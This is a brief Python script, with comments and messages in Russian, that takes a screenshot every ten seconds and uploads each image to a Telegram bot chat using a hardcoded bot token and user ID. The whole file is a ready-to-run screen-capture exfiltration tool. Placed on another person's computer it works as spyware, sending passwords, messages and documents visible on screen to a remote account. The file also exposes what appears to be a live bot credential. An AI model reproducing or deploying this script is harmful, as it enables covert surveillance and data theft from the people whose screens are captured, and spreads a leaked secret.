import time
import requests
import pyautogui
import io


BOT_TOKEN = "8484577605:AAHB7P9rlJZtbL22Wi4gkETvuJV95EF3_hA"
USER_ID = 5408815833
INTERVAL = 10  # секунд


SEND_URL = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"


def send_screenshot():
    screenshot = pyautogui.screenshot()

    img_bytes = io.BytesIO()
    screenshot.save(img_bytes, format="PNG")
    img_bytes.seek(0)

    files = {
        "photo": ("screenshot.png", img_bytes)
    }

    data = {
        "chat_id": USER_ID
    }

    response = requests.post(SEND_URL, data=data, files=files)
    return response.ok


print("Скрипт запущен. Отправка скриншотов...")

while True:
    try:
        ok = send_screenshot()
        if ok:
            print("Скрин отправлен")
        else:
            print("Ошибка отправки")
    except Exception as e:
        print("Ошибка:", e)

    time.sleep(INTERVAL)
